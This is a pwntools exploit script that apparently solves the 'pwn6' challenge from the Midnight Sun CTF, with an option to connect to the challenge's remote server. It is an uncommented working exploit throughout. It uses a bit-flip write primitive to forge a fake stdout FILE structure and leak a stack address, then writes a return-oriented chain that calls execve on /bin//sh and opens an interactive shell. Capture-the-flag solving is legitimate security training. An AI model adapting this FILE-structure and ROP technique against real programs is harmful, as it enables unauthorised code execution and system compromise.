from pwn import *

e = ELF("./pwn6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn6-01.play.midnightsunctf.se", 10006)
else:
  p = process(e.path)

def write(addr, idx, skip=False):
	pay = (hex(addr)[2:] + ":" + str(idx))

	if skip:
		p.sendline(pay)
	else:
		p.sendlineafter("addr:", pay)

def write_all(s, base, skip=False):
  for i in range(len(s)):
    curr = ord(s[i])

    for j in range(8):
      if ((1 << j) & curr) != 0:
        write(base + i, j, skip)

cnt = 0x6d7330
environ = 0x6d7da8

write(cnt + 3, 7)

fake = p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + p64(environ) + p64(environ + 8) + p64(0x00000000006d53e3) * 2 + p64(0x00000000006d53e4) + p64(0) * 4 + p64( 0x00000000006d5580) + p64(1) + p64( 0xffffffffffffffff) + p64( 0x000000000a000000   ) + p64( 0x00000000006d7d30) + p64( 0xffffffffffffffff ) + p64(0) + p64(  0x00000000006d5440 ) + p64(0) * 3 + p64(  0x00000000ffffffff ) + p64(0) * 2 + p64(  0x00000000006d6fe0)

stdout = 0x6d5360
write_all(fake, stdout + 0x2000)


write(0x6d57a1, 5)

stk = u64(p.recvuntil("addr", drop=True)[-8 - 4:-4])
print(hex(stk))

rbp = stk - 0x7fff4346cec8 + 0x7fff4346cd70

def get_pay():
	from struct import pack
	p = ''

	p += pack('<Q', 0x0000000000410433) # pop rsi ; ret
	p += pack('<Q', 0x00000000006d50e0) # @ .data
	p += pack('<Q', 0x00000000004158a4) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x0000000000487b51) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000410433) # pop rsi ; ret
	p += pack('<Q', 0x00000000006d50e8) # @ .data + 8
	p += pack('<Q', 0x0000000000444e00) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000487b51) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004006a6) # pop rdi ; ret
	p += pack('<Q', 0x00000000006d50e0) # @ .data
	p += pack('<Q', 0x0000000000410433) # pop rsi ; ret
	p += pack('<Q', 0x00000000006d50e8) # @ .data + 8
	p += pack('<Q', 0x0000000000449af5) # pop rdx ; ret
	p += pack('<Q', 0x00000000006d50e8) # @ .data + 8
	p += pack('<Q', 0x0000000000444e00) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047cfa0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047d545) # syscall ; ret

	return p


write_all(get_pay(), stdout + 0x30b0, skip=True)
write_all(p64((0x00007ffe06c5aaa0 + stk - 0x7ffe06c5abd8) ^ (stdout + 0x30b0 - 8))+ p64(  0x0000000000400c8b ^ 0x400c20), rbp, skip=True)

write(cnt + 3, 7)

p.sendline("echo 3z3z")
p.recvuntil("3z3z")

p.interactive()
